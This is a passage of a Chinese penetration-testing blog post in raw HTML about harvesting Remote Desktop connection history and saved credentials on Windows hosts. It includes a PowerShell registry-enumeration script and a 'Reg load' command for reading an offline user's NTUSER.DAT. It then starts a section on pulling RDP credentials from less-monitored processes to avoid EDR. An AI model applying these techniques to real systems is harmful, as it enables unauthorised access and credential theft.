rgb(0, 134, 179);">ErrorAction</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Stop</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Catch</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Write</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Host</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"No RDP Connections History"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Write</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Host</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"----------------------------------"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">continue</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">foreach</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$Name </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">in</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $QueryPath</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">   </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Try</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">            </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">                $User </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ItemProperty</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Path</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $RegPath$Name </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ErrorAction</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Stop</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">UsernameHint</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">                </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Write</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Host</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"Server:"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$Name</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">                </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Write</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Host</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"User:"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$User</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">            </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">            </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Catch</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">            </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">            </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Write</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Host</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"No RDP Connections History"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">            </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Write</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Host</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"----------------------------------"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code></pre></section><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">导出所有用户的历史记录</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">前面刚说了，对于未登录用户，无法直接获得注册表配置信息，那有什么解决办法？其实这里可以通过加载配置单元的方式来解决，即打开用户的 NTUSER.DAT 文件，加载配置单元导入用户配置信息，然后进行枚举。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">选中 HKEY_USERS 项，“文件” —&gt; “加载配置单元”，如下图：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5224550898203593" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/8_phTrz3TzVVbkqbiaJK9xguHk27kF3g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPdUVOTmwz7j72oF0XLXtGjPEEIphTrz3TzVVbkqbiaJK9xguHk27kF3g/640?wx_fmt=png'" data-type="png" data-w="668" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210524091026247</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">选择打开用户的 NTUSER.DAT 文件，路径为&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">C:\Documents and Settings\用户名\NTUSER.DAT</code>，这里以当前未登录的 moretz 用户为例：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6182287188306105" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/9_kXe40NLv0eQW9zjfzDZWicFW1vyXnA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPgyjcOxSiamuM4mhNHIaBnibJLmUkXe40NLv0eQW9zjfzDZWicFW1vyXnA/640?wx_fmt=png'" data-type="png" data-w="1163" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210524092246927</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">接着指定一个项名称，即可在 HKEY_USERS 下读取该用户的注册表配置信息，如下图所示：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6111963190184049" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/10_0cVppg64VKakK6R8LRjOmjZCzXpVvw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEP8MINmDoI9Nu8s2GAR16DOD7R0cVppg64VKakK6R8LRjOmjZCzXpVvw/640?wx_fmt=png'" data-type="png" data-w="1304" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210524092404538</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后按照之前的路径进行枚举即可。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">此外，也可以通过命令行实现加载配置单元的实例：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Reg</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> load HKEY_USERS\testmoretz C</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\Documents </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">and</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Settings</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\moretz\NTUSER</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">DAT</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">最后给出一个三好学生写的枚举脚本：https://github.com/3gstudent/List-RDP-Connections-History</p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">获取 RDP 远程桌面连接凭据</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">一般的，就抓取凭据方面而言，很多人专注于从 lsass.exe 进程里面窃取凭据，但是 lsass.exe 通常来说已经是被 EDR 产品重点监控的进程了，因此我们自然而然的研究方向便是找到可能不太严格审查的替代方案。这就引出了我们下文中对 RDP 凭据的收集。与 lsass.exe 一样，RDP 协议相关的进程例如 svchost.exe、mstsc.exe 等也在收集凭证的范围内，并且从这些进程中收集凭据不需要管理员特权。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">当我们发现目标主机中存在远程桌面连接的历史记录时，我们可以根据历史记录找到其连接过的远程桌面，并确定出关键的服务器。但光找到关键的服务器那能够啊！我们最好能够导出连接远程桌面的连接凭据，获取服务器密码。下面我们便来简单介绍几个可以导出远程桌面连接凭据的方法。</p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">在凭据管理器中查看 Windows 凭据</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">对于那些经常使用 RDP 远程桌面连接远程服务器的用户来说，如果他不想对远程主机进行多次身份验证的话，他们可能会保存连接的详细信息，以便进行快速的身份验证。而这些凭据使用数据保护 API 以加密的形式存储在 Windows 的凭据管理器中。</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/11_t9MXibfCqbrficoVXS8qCPpWDSYyXw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPUZqyQhFCCA8wian7ryQgYxxSxXLt9MXibfCqbrficoVXS8qCPpWDSYyXw/640?wx_fmt=png'" data-type="png" data-w="1235" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, 